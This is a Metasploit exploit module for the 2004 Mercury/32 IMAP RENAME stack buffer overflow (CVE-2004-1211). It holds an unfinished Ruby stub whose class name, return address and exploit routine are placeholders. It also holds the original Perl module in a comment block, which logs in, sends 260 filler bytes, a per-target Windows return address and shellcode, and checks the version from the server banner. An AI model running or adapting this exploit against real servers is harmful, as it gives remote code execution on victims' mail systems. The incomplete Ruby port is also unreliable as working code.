require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Mercury/32 v4.01a IMAP RENAME Buffer Overflow',
			'Description'    => %q{
				Mercury/32 v4.01a IMAP server is prone to a remotely
				exploitable stack-based buffer overflow vulnerability. This
				issue is due to a failure of the application to properly
				bounds check user-supplied data prior to copying it to a
				fixed size memory buffer.
					
			},
			'Author'         => [ 'y0 <y0@w00t-shell.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2004-1211'],
					[ 'BID', '11775'],
					[ 'NSS', '15867'],
					[ 'MIL', '98'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0d\x20",
					'Prepend'  => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Nov 29 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mercury_imap;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	'Name'    => 'Mercury/32 v4.01a IMAP RENAME Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'y0 <y0 [at] w00t-shell.net>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'IMAP Username'],
		'PASS'  => [1, 'DATA', 'IMAP Password'],
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'process' },
	'Payload' =>
	  {
		'Space'     => 500,
		'BadChars'  => "\x00\x0a\x0d\x20",
		'Prepend'   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
Mercury/32 v4.01a IMAP server is prone to a remotely exploitable 
stack-based buffer overflow vulnerability. This issue is due 
to a failure of the application to properly bounds check 
user-supplied data prior to copying it to a fixed size memory buffer.
}),

	'Refs'  =>
	  [
		['CVE','2004-1211'],
		['BID', '11775'],
		['NSS', '15867'],
		['MIL', '98'],
	  ],

	'Targets' =>
	  [
		['Windows 2000 SP4 English',   0x7c2f8498 ],
		['Windows 2000 SP4 English',   0x7846107b],
		['Windows XP Pro SP0 English', 0x77dc0df0 ],
		['Windows XP Pro SP1 English', 0x77e53877 ],
	  ],

	'Keys' => ['imap'],

	'DisclosureDate' => 'Nov 29 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("a001 LOGOUT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /Mercury\/32 v4\.01a/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $user        = $self->GetVar('USER');
	my $pass        = $self->GetVar('PASS');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );

	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);

	my $sploit = "a001 LOGIN $user $pass\r\n";
	$sock->Send($sploit);
	my $resp = $sock->Recv(-1);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}
	if($resp !~ /^a001 OK LOGIN/) {
		$self->PrintLine('Login error: ' . $resp);
		return;
	}
	$self->PrintLine('[*] Logged in, sending overflow...');

	my $splat = Pex::Text::UpperCaseText(260);
	$sploit =
	  "a001 RENAME ". $splat. pack('V', $target->[1]).
	  $shellcode. "\r\n";

	$sock->Send($sploit);

	my $resp = $sock->Recv(-1);
	if(length($resp)) {
		$self->PrintLine('[*] Got response, bad: ' . $resp);
	}
	return;
}

1;

=end


end
end	
